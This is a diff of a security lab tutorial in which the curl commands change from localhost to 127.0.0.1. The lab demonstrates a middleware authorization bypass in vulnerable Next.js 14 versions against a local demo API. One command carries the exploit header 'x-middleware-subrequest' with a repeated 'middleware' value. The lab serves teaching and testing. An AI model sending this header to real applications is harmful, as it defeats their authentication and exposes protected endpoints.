@@ -22,7 +22,7 @@ While you can [access the demo application]({{TRAFFIC_HOST1_8080}}/api/hello) us
 Go ahead and make an HTTP GET request (without an authorization header) replicating the browser behavior:
 
 ```shell
-curl -v http://localhost:8080/api/hello | jq
+curl -v http://127.0.0.1:8080/api/hello | jq
 ```{{exec}}
 
 <details>
@@ -61,7 +61,7 @@ The application correctly responds with the message "unauthorized" (combined wit
 ```shell
 curl -v \
   -H "Authorization: my-jwt-token-here" \
-   http://localhost:8080/api/hello \
+   http://127.0.0.1:8080/api/hello \
    | jq
 ```{{exec}}
 
@@ -108,7 +108,7 @@ As seen here, by using the vulnerable Next.js version 14 (up to 14.2.24), where 
 ```shell
 curl -v \
   -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" \
-  http://localhost:8080/api/hello \
+  http://127.0.0.1:8080/api/hello \
   | jq
 ```{{exec}}
 
